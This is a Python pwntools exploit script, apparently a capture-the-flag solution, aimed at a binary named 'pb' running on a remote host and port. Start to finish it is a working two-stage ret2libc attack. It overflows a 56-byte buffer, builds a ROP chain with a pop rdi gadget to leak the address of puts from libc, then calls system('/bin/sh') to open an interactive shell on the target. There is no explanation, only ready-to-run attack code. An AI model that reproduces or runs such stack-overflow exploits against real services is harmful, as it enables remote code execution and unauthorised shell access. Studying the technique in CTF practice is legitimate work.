from pwn import *
from time import sleep

# p = process('./pb')
p = remote('165.227.224.40', 30482)

bb = ELF('./pb')
libc = ELF('./glibc/libc.so.6')
rop_bb = ROP(bb)

ret = rop_bb.find_gadget(['ret']).address
pop_rdi = rop_bb.find_gadget(['pop rdi', 'ret']).address
puts_got = bb.got['puts']
puts_plt = bb.plt['puts']

# gdb.attach(p, gdbscript='b *0x4013a5')
p.sendline(b'2')

payload = b'A' * 56
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(0x4012c2)

p.sendline(payload) 
p.recvuntil(b'thank you!\n\n')
resp = p.recvuntil(b'\n')[:-1].ljust(8, b'\x00')
libc_addr = u64(resp) - libc.symbols["puts"]
print(f'LIBC ADDR: {hex(libc_addr)}')

bin_sh = next(libc.search(b'/bin/sh')) + libc_addr
system_addr = libc.symbols['system'] + libc_addr

p.sendline(b'2')

payload = b'A' * 56
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()
